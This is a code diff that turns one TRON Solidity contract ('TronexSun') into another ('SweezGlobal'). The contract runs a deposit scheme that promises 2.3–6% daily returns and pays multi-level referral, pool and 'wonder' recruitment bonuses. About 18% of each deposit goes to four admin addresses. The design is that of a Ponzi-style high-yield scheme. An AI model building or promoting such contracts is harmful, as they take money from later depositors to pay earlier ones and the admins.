@@ -1,8 +1,10 @@
 pragma solidity 0.5.4;
 
-contract TronexSun {
+contract SweezGlobal {
 
     struct User {
+        uint256 userid;
+        uint256 refid;
         address upline ;
         uint256 referrals ;
         uint256 payouts ;
@@ -11,25 +13,37 @@ contract TronexSun {
         uint256 pool_bonus ;
         uint256 deposit_amount ;
         uint256 deposit_payouts ;
-        uint40 deposit_time ;
+        uint40 deposit_time ; 
+        uint256 wonder_directs;
+		uint256 wonder_bonus ;
+        uint256 isActive ;
+    } 
+
+    struct UserTotal {
         uint256 total_deposits ;
         uint256 total_payouts ;
         uint256 total_structure ;
-		uint256 team_biz ;
-        uint256 isActive ;
-    } 
+        bool isWonder ;
+    }
+ 
     
-    uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx ; // 1000000 trx
-    uint256 constant public MIN_DEPOSIT = 100 trx ; // 100 trx
-    uint256 constant public time_period = 1 days ; // 1 days 
+    // uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx ; // 1000000 trx
+    // uint256 constant public MIN_DEPOSIT = 100 trx ; // 100 trx
+    // uint256 constant public time_period = 1 days ; // 1 days 
+    // uint256 constant public wonder_period = 7 days ; // 7 days 
+    // uint256 constant public aff_bonus = 10 ; // 10 percent
+
+    uint256 constant public CONTRACT_BALANCE_STEP = 100 trx ; // 1000000 trx
+    uint256 constant public MIN_DEPOSIT = 10 trx ; // 100 trx
+    uint256 constant public time_period = 180 ; // 1 days 
+    uint256 constant public wonder_period = time_period*7 ; // 7 days 
     uint256 constant public aff_bonus = 10 ; // 10 percent
 
-   	uint256 constant public team_levels = 30 ;
     uint256 constant public promo_fee  = 100 ;   
-    uint256 constant public admin_fee1  = 40 ;   
-    uint256 constant public admin_fee2  = 20 ;   
+    uint256 constant public admin_fee1  = 50 ;   
+    uint256 constant public admin_fee2  = 30 ;   
 
-    uint256 constant public BASE_PERCENT = 110 ; // 1.1% daily  
+    uint256 constant public BASE_PERCENT = 230 ; // 2.3% daily  
 	uint256 constant public PERCENTS_DIVIDER = 10000 ; 
 
     //pool bonus
@@ -41,10 +55,12 @@ contract TronexSun {
     mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum ;
     mapping(uint8 => address) public pool_top ;
     mapping(address => User) public users ;
+    mapping(uint256 => address) public ids ;
+    mapping(address => UserTotal) public usertotals ;
     mapping(address => bool) public top_promoters;
 
     uint8[] public ref_bonuses ;  
-    uint256 public total_users = 0 ;
+    uint256 public total_users = 1 ;
     uint256 public total_deposited ;
     uint256 public total_withdraw ;
     
@@ -53,36 +69,41 @@ contract TronexSun {
     event DirectPayout(address indexed addr, address indexed from, uint256 amount) ;
     event MatchPayout(address indexed addr, address indexed from, uint256 amount) ;
     event PoolPayout(address indexed addr, uint256 amount) ;
+    event WonderPayout(address indexed addr, uint256 amount) ;
     event Withdraw(address indexed addr, uint256 amount) ;
     event LimitReached(address indexed addr, uint256 amount) ; 
     
     address payable public owner ; 
-    address payable public marketer ; 
-    address payable public fee1 ;
-    address payable public fee2 ;
+    address payable public admin1 ;
+    address payable public admin2 ;
+    address payable public admin3 ;
+    address payable public admin4 ;
     address payable public alt_owner ;
 
     constructor(address payable _owner, 
-                address payable _marketer, 
-                address payable _fee1, 
-                address payable _fee2, 
+                address payable _admin1, 
+                address payable _admin2, 
+                address payable _admin3, 
+                address payable _admin4, 
                 address payable _alt_owner) public {
 
         owner = _owner;
-        marketer = _marketer;
-        fee1 = _fee1;
-        fee2 = _fee2;
+        admin1 = _admin1;
+        admin2 = _admin2;
+        admin3 = _admin3;
+        admin4 = _admin4;
 		alt_owner = _alt_owner;
          
         ref_bonuses.push(30);
         ref_bonuses.push(10);
         ref_bonuses.push(5);
-        ref_bonuses.push(5);  // 40
+        ref_bonuses.push(5);  
         ref_bonuses.push(5);
-        ref_bonuses.push(5);
-        ref_bonuses.push(5);
-        ref_bonuses.push(5);
-        ref_bonuses.push(5);  // 75 
+        ref_bonuses.push(5); // 60
+
+        ref_bonuses.push(10);
+        ref_bonuses.push(10);
+        ref_bonuses.push(10); // 90 
 
         pool_bonuses.push(40);
         pool_bonuses.push(20);
@@ -94,22 +115,23 @@ contract TronexSun {
     function _setUpline(address _addr, address _upline) private {
         if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && 
 		(users[_upline].deposit_time > 0 || _upline == owner) ) {
+            
             users[_addr].upline = _upline;
             users[_upline].referrals++;
 
             emit Upline(_addr, _upline);
 
-            total_users++;
+            total_users++; 
 
             for(uint8 i = 0; i < ref_bonuses.length; i++) {
                 if(_upline == address(0)) break; 
-                users[_upline].total_structure++; 
+                usertotals[_upline].total_structure++; 
                 _upline = users[_upline].upline;
             }
         }
     }
 
-    function _deposit(address _addr, uint256 _amount) private {
+    function _deposit(address _addr, uint256 _amount, uint256 _refid) private {
         require(users[_addr].upline != address(0) || _addr == owner, "No upline");
 
         if(users[_addr].deposit_time > 0) {
@@ -117,28 +139,33 @@ contract TronexSun {
             require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
             require(_amount >= users[_addr].deposit_amount  , "Bad amount");
         }
-        else require(_amount >= MIN_DEPOSIT  , "Bad amount");
-        
+        else require(_amount >= MIN_DEPOSIT  , "Bad amount"); 
+
+        ids[total_users] = _addr;
+        users[_addr].userid = total_users;
+        users[_addr].refid = _refid;
         users[_addr].payouts = 0;
         users[_addr].deposit_amount = _amount;
         users[_addr].deposit_payouts = 0;
         users[_addr].isActive = 1;
         users[_addr].deposit_time = uint40(block.timestamp);
-        users[_addr].total_deposits += _amount;
+        usertotals[_addr].total_deposits += _amount;
  
         total_deposited += _amount;
         
         emit NewDeposit(_addr, _amount);
-
-		address _upline = users[_addr].upline;
-
-		 for(uint8 i = 0; i < team_levels - 1; i++) {
-                if(_upline == address(0)) break;
-
-                users[_upline].team_biz += _amount; 
-                _upline = users[_upline].upline;
+ 
+         // wonder directs check
+        if(usertotals[users[_addr].upline].isWonder == false && block.timestamp < (users[users[_addr].upline].deposit_time + wonder_period) && users[users[_addr].upline].deposit_amount >= _amount){
+            users[users[_addr].upline].wonder_directs++;
+            
+            if(users[users[_addr].upline].wonder_directs == 7){
+                users[users[_addr].upline].wonder_bonus = users[users[_addr].upline].deposit_amount;
+                usertotals[users[_addr].upline].isWonder = true;
+                emit WonderPayout(users[_addr].upline, users[users[_addr].upline].deposit_amount);
             }
-
+        }
+  
         if(users[_addr].upline != address(0)) {
             users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;
 
@@ -150,13 +177,14 @@ contract TronexSun {
             _drawPool();
         }
 
-         marketer.transfer(_amount * promo_fee / 1000); 
-         fee1.transfer(_amount * admin_fee1 / 1000); 
-         fee2.transfer(_amount * admin_fee2 / 1000); 
+         admin1.transfer(_amount * admin_fee1 / 1000); 
+         admin2.transfer(_amount * admin_fee1 / 1000); 
+         admin3.transfer(_amount * admin_fee1 / 1000); 
+         admin4.transfer(_amount * admin_fee2 / 1000);  // Reserve Fund
     }
 
      function _poolDeposits(address _addr, uint256 _amount) private {
-        pool_balance += _amount * 3 / 100;
+        pool_balance += _amount * 10 / 100;
 
         address upline = users[_addr].upline;
 
@@ -233,9 +261,11 @@ contract TronexSun {
         }
     }
  
-    function deposit(address _upline) payable external {
+    function deposit(uint256 _refid) payable external {
+
+        address _upline = ids[_refid]; 
         _setUpline(msg.sender, _upline);
-        _deposit(msg.sender, msg.value);
+        _deposit(msg.sender, msg.value, _refid);
     }
 
  
@@ -281,7 +311,7 @@ contract TronexSun {
             to_payout += pool_bonus;
         } 
        
-        // Match payout
+        // Generation payout
         if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {
             uint256 gen_bonus = users[msg.sender].gen_bonus;
 
@@ -294,9 +324,22 @@ contract TronexSun {
             to_payout += gen_bonus;
         }
 
+        // Wonder payout
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].wonder_bonus > 0) {
+            uint256 wonder_bonus = users[msg.sender].wonder_bonus;
+
+            if(users[msg.sender].payouts + wonder_bonus > max_payout) {
+                wonder_bonus = max_payout - users[msg.sender].payouts;
+            }
+
+            users[msg.sender].wonder_bonus -= wonder_bonus;
+            users[msg.sender].payouts += wonder_bonus;
+            to_payout += wonder_bonus;
+        }
+
         require(to_payout > 0, "Zero payout");
         
-        users[msg.sender].total_payouts += to_payout;
+        usertotals[msg.sender].total_payouts += to_payout;
         total_withdraw += to_payout;
         if(to_payout > 0){
              msg.sender.transfer(to_payout); 
@@ -337,21 +380,15 @@ contract TronexSun {
  
 	function getTotalRate() internal view returns(uint256) {
 	 
- 		uint256 step1 = 0;
-		uint256 step2 = 0;
-		uint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;
+ 		 uint256 steps =  10*total_deposited/CONTRACT_BALANCE_STEP ;
 
-         if(steps <= 50){
-             step1 = steps*2;
-             step2 = 0; 
-         } else {
-             step1 = 100;
-             step2 = (steps*2 - 100)/2;
-         }
-         uint256 total_step = step1 + step2;
-         uint256 total1 = BASE_PERCENT+total_step;
-         if(total1 > 500){
-             total1 = 500;
+         if(steps > 370){
+             steps = 370; 
+         }  
+ 
+         uint256 total1 = BASE_PERCENT + steps;
+         if(total1 > 600){
+             total1 = 600;
          }
          
         return total1 ;
@@ -365,53 +402,32 @@ contract TronexSun {
 		return address(this).balance;
 	}  
 
-	function getRate() external view returns(uint256) {
-	 
-        uint256 step1 = 0;
-        uint256 step2 = 0;
-        uint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;
+	function getRate() external view returns(uint256) { 
+        uint256 steps =  10*total_deposited/CONTRACT_BALANCE_STEP ;
 
-         if(steps <= 50){
-             step1 = steps*2;
-             step2 = 0; 
-         } else {
-             step1 = 100;
-             step2 = (steps*2 - 100)/2;
-         }
-         uint256 total_step = step1 + step2;
-
-         uint256 total1 = BASE_PERCENT+total_step;
-         if(total1 > 500){
-             total1 = 500;
-         }
-         
+         if(steps > 370){
+             steps = 370; 
+         }  
+         uint256 total1 = BASE_PERCENT + steps;
+         if(total1 > 600){
+             total1 = 600;
+         } 
         return total1 ;
 	}
 
     function getContractBonus() external view returns(uint256) {
-     
-        uint256 step1 = 0;
-        uint256 step2 = 0;
-        uint256 steps = total_deposited/CONTRACT_BALANCE_STEP ;
+      
+        uint256 steps = 10*total_deposited/CONTRACT_BALANCE_STEP ;
 
-         if(steps <= 50){
-             step1 = steps*2;
-             step2 = 0; 
-         } else {
-             step1 = 100;
-             step2 = (steps*2 - 100)/2;
-         }
-         uint256 total_step = step1 + step2; 
-         if(total_step > 390){
-             total_step = 390;
-         }
+         if(steps > 370){
+             steps = 370;
+         }  
+         uint256 total_step = steps;  
         return total_step ;
     } 
 
-    function maxPayoutOf(uint256 _amount) external view returns(uint256) {
-		 
-			return  _amount * 320 / 100;
-	  
+    function maxPayoutOf(uint256 _amount) external view returns(uint256) { 
+			return  _amount * 250 / 100; 
     } 
 
 	function getUserBalance(address _addr) external view returns (uint256) {
@@ -455,42 +471,43 @@ contract TronexSun {
             to_payout += pool_bonus;
         }
 
+          // Wonder payout 
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].wonder_bonus > 0) {
+            uint256 wonder_bonus = users[msg.sender].wonder_bonus;
+
+            if(users[msg.sender].payouts + wonder_bonus > max_payout) {
+                wonder_bonus = max_payout - users[msg.sender].payouts;
+            }  
+            to_payout += wonder_bonus;
+        }
+
         if(users[_addr].payouts >= max_payout) {
 			return 0;       
 		 } else {
 			 return to_payout;
 		 }
-    } 
+    }  
+ 
+	function changeAdmin1(address payable _newAdmin1) public {
+		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin1 , "Not allowed");
+		admin1 = _newAdmin1;
+	} 
+ 
+ 
+	function changeAdmin2(address payable _newAdmin2) public {
+		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin2, "Not allowed");
+		admin2 = _newAdmin2;
+	} 
 
-	function changeMarketer(address payable _marketer) public {
-		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == marketer, "Not allowed");
-		marketer = _marketer;
+    function changeAdmin3(address payable _newAdmin3) public {
+		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin3, "Not allowed");
+		admin3 = _newAdmin3;
+	} 
+
+    function changeAdmin4(address payable _newAdmin4) public {
+		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == admin4, "Not allowed");
+		admin4 = _newAdmin4;
 	}  
- 
-	function changeFee1(address payable _newFee1) public {
-		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == fee1 , "Not allowed");
-		fee1 = _newFee1;
-	} 
- 
- 
-	function changeFee2(address payable _newFee2) public {
-		require(msg.sender == owner || msg.sender == alt_owner || msg.sender == fee2, "Not allowed");
-		fee2 = _newFee2;
-	} 
- 
-    
-    function setTopPromoterStatus(address _addr) public {
-		require(msg.sender == owner || msg.sender == alt_owner  , "Not allowed");
-		if(top_promoters[_addr] == false){
-            top_promoters[_addr] = true;
-        } else {
-            top_promoters[_addr] = false;
-        }
-	} 
- 
-    function getTopPromoterStatus(address _addr) external view returns (bool){
- 		 return top_promoters[_addr];
-	} 
    
     function getAdmin() external view returns (address){ 
         return owner;
@@ -499,15 +516,18 @@ contract TronexSun {
     function getUser() external view returns (address){ 
         return alt_owner;
     } 
-
-    function getMarketer() external view returns (address){ 
-        return marketer;
+ 
+    function admin1Address() external view returns (address){ 
+        return admin1;
     } 
-    function getFee1Address() external view returns (address){ 
-        return fee1;
+    function admin2Address() external view returns (address){ 
+        return admin2;
     } 
-    function getFee2Address() external view returns (address){ 
-        return fee2;
+    function admin3Address() external view returns (address){ 
+        return admin3;
+    } 
+    function admin4Address() external view returns (address){ 
+        return admin4;
     } 
 
      function getNow() external view returns (uint256){ 
@@ -515,15 +535,19 @@ contract TronexSun {
     }
 
     function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status) {
-        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive  );
+        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive );
+    }
+
+    function userInfo2(address _addr) view external returns(uint256 wonder_bonus , uint256 wonder_directs) {
+        return (users[_addr].wonder_bonus, users[_addr].wonder_directs);
     }
 
     function poolBonus(address _addr) view external returns(uint256){
         return users[_addr].pool_bonus;
     }
 
-    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz, uint256 deposit_payouts) {
-        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz, users[_addr].deposit_payouts);
+    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure,   uint256 deposit_payouts) {
+        return (users[_addr].referrals, usertotals[_addr].total_deposits, usertotals[_addr].total_payouts, usertotals[_addr].total_structure,  users[_addr].deposit_payouts);
     }
 
     function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider ) {
